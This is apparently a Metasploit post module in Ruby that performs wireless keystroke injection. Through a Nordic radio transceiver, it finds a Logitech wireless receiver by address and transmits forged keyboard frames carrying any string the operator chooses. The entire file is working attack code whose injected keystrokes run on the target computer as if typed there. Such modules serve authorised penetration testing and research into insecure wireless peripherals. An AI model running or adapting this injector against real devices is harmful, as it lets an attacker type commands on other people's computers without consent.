class MetasploitModule < Msf::Post

  include Msf::Post::Hardware::RFTransceiver::RFTransceiver
  include Msf::Post::Hardware::RFTransceiver::NordicRF
  include Msf::Post::Hardware::RFTransceiver::USB_HID

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'NordicRF HID Keystroke Injector',
        'Description'   => %q{
            This module interfaces with an HWBridge-connected NordicRF radio transceiver.
            This is a sample module that takes a string and sends it via the wireless HID device
        },
        'References'     =>
        [
          ['URL', 'https://github.com/BastilleResearch/nrf-research-firmware'],
          ['URL', 'https://github.com/insecurityofthings/jackit']
        ],
        'License'       => MSF_LICENSE,
        'Author'        => ['Craig Smith'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptString.new('ADDRESS', [true, "Address to transmit on.  Find via sniffing"]),
      OptString.new('BRAND', [true, "Specify brand.  Supports: Logitech", "Logitech"]),
      OptString.new('STRING', [true, "String to send to HID device", "Follow the white rabbit"]),
      OptInt.new('INDEX', [false, "USB Index to use", 0])
    ], self.class)

  end

  def run
    unless is_nordicrf?
      print_error("Requires a NordicRF Transceiver")
      return
    end
    if not set_index(datastore['INDEX'])
      print_error("Couldn't set usb index to #{datastore["INDEX"]}")
      return
    end
    keys = string_to_hids(datastore['STRING'])
    if datastore['BRAND'].downcase == "logitech"
      frames = build_logitech_frames(keys)
    else
      print_error("Currently BRAND only supports: Logitech")
      return
    end
    enable_lna
    print_status("Scanning for #{datastore['ADDRESS']}...")
    channel = find_channel(datastore['ADDRESS'])
    if channel == -1
      print_error("Couldn't find device channel")
      return
    end
    print_status("Found device on channel #{channel}")
    set_channel(channel)
    print_status("Transmitting String to #{datastore['ADDRESS']}")
    transmit_frames(frames)
    print_status("Done.")
  end

end
